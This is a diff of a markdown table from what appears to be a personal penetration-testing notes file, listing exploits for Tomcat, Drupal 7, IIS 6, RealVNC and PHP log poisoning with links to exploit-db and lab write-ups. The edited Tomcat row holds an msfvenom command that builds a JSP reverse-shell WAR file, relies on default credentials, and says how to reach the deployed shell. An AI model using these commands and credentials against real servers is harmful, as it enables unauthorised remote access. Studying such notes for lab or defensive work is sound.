@@ -109,8 +109,8 @@ Here I am collectign some of the random exploits and their exploitation technqiu
 |5. |PHP log poisoning | https://www.hackingarticles.in/apache-log-poisoning-through-lfi/ | https://0xdf.gitlab.io/2018/09/08/htb-poison.html | --- | --- | --- |
 |6.|IIS6.0 | [Zero day exploit to get reverse shell](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell) |- |- |-|
 |7.|Drupal7.x|7.x Module Services - Remote Code Execution           | php/webapps/41564.php |- | - |change the urllink, change the system command so you can execute cmd and change to rest |
-|8.| Tomcat |tomcat default credentials tomcat:tomcat(wrong password policy) | Tomcat running with defaul passowrd |ip:port/manager/html | msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.169.193.128 LPORT=443 -f war -o sr.war |   |
-|9.| Real VNC 4.1.0/4.1.1 | Authenticaton Bypass | Administrator password was writeen in the macine login window.|[36932] (https://www.exploit-db.com/exploits/36932) | Reverse Shell | Writeup and Reference |
+|8.| Tomcat |tomcat default credentials tomcat:tomcat(wrong password policy) | Tomcat running with defaul passowrd |ip:port/manager/html | msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.169.193.128 LPORT=443 -f war -o shell.war |  After deploying the war file acess it using ip://8080/shell |
+|9.| Real VNC 4.1.0/4.1.1 | Authenticaton Bypass | Administrator password was writeen in the macine login window.|[36932](https://www.exploit-db.com/exploits/36932) | Reverse Shell | Writeup and Reference |
 
 
 
